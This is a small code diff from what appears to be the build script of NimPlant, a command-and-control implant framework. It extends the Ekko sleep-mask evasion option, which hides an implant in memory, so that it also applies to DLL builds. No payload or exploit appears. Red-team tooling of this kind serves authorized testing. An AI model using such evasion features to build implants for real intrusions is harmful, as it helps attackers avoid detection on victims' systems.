@@ -130,7 +130,7 @@ def compile_nim(binary_type, xor_key, debug=False):
 
     # Enable Ekko sleep mask if defined in config.toml, but only for self-contained executables
     sleep_mask_enabled = config["nimplant"]["sleepMask"]
-    if sleep_mask_enabled and binary_type not in ["exe", "exe-selfdelete"]:
+    if sleep_mask_enabled and binary_type not in ["exe", "exe-selfdelete", "dll"]:
         print("       ERROR: Ekko sleep mask is only supported for executables!")
         print(f"       Compiling {binary_type} without sleep mask...")
         sleep_mask_enabled = False
